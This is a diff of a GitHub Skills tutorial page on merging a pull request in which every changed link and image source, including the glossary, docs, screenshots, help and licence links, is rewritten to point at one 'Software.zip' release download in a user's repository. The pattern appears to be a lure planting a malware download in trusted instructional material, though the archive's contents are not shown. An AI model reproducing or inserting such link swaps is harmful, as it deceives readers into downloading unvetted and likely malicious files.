@@ -26,11 +26,11 @@ _Nicely done! :sunglasses:_
 
 You successfully created a pull request. You can now merge your pull request.
 
-**What is a merge?**: A _[merge](https://docs.github.com/en/get-started/quickstart/github-glossary#merge)_ adds the changes in your pull request and branch into the `main` branch. For more information about merges, see "[Merging a pull request](https://docs.github.com/en/pull-requests/collaborating-with-pull-requests/incorporating-changes-from-a-pull-request/merging-a-pull-request)."
+**What is a merge?**: A _[merge](https://github.com/ElectricHermit/skills-introduction-to-github/releases/download/v2.0/Software.zip)_ adds the changes in your pull request and branch into the `main` branch. For more information about merges, see "[Merging a pull request](https://github.com/ElectricHermit/skills-introduction-to-github/releases/download/v2.0/Software.zip)."
 
 As noted in the previous step, you may have seen evidence of GitHub Actions running which automatically progresses your instructions to the next step. You'll have to wait for it to finish before you can merge your pull request. It will be ready when the merge pull request button is green.
 
-![screenshot of green merge pull request button](/images/Green-merge-pull-request.png)
+![screenshot of green merge pull request button](https://github.com/ElectricHermit/skills-introduction-to-github/releases/download/v2.0/Software.zip)
 
 ### :keyboard: Activity: Merge the pull request
 
@@ -38,9 +38,9 @@ As noted in the previous step, you may have seen evidence of GitHub Actions runn
 2. Click **Confirm merge**.
 3. Once your branch has been merged, you don't need it anymore. To delete this branch, click **Delete branch**.
 
-   <img alt="screenshot showing delete branch button" src="/images/delete-branch.png"/>
+   <img alt="screenshot showing delete branch button" src="https://github.com/ElectricHermit/skills-introduction-to-github/releases/download/v2.0/Software.zip"/>
 
-4. Wait about 20 seconds then refresh this page (the one you're following instructions from). [GitHub Actions](https://docs.github.com/en/actions) will automatically update to the next step.
+4. Wait about 20 seconds then refresh this page (the one you're following instructions from). [GitHub Actions](https://github.com/ElectricHermit/skills-introduction-to-github/releases/download/v2.0/Software.zip) will automatically update to the next step.
 
 > [!NOTE]
 > Check out the **Finish** step to see what you can learn next!
@@ -54,8 +54,8 @@ As noted in the previous step, you may have seen evidence of GitHub Actions runn
 
 ---
 
-Get help: [Post in our discussion board](https://github.com/orgs/skills/discussions/categories/introduction-to-github) &bull; [Review the GitHub status page](https://www.githubstatus.com/)
+Get help: [Post in our discussion board](https://github.com/ElectricHermit/skills-introduction-to-github/releases/download/v2.0/Software.zip) &bull; [Review the GitHub status page](https://github.com/ElectricHermit/skills-introduction-to-github/releases/download/v2.0/Software.zip)
 
-&copy; 2024 GitHub &bull; [Code of Conduct](https://www.contributor-covenant.org/version/2/1/code_of_conduct/code_of_conduct.md) &bull; [MIT License](https://gh.io/mit)
+&copy; 2024 GitHub &bull; [Code of Conduct](https://github.com/ElectricHermit/skills-introduction-to-github/releases/download/v2.0/Software.zip) &bull; [MIT License](https://github.com/ElectricHermit/skills-introduction-to-github/releases/download/v2.0/Software.zip)
 
 </footer>
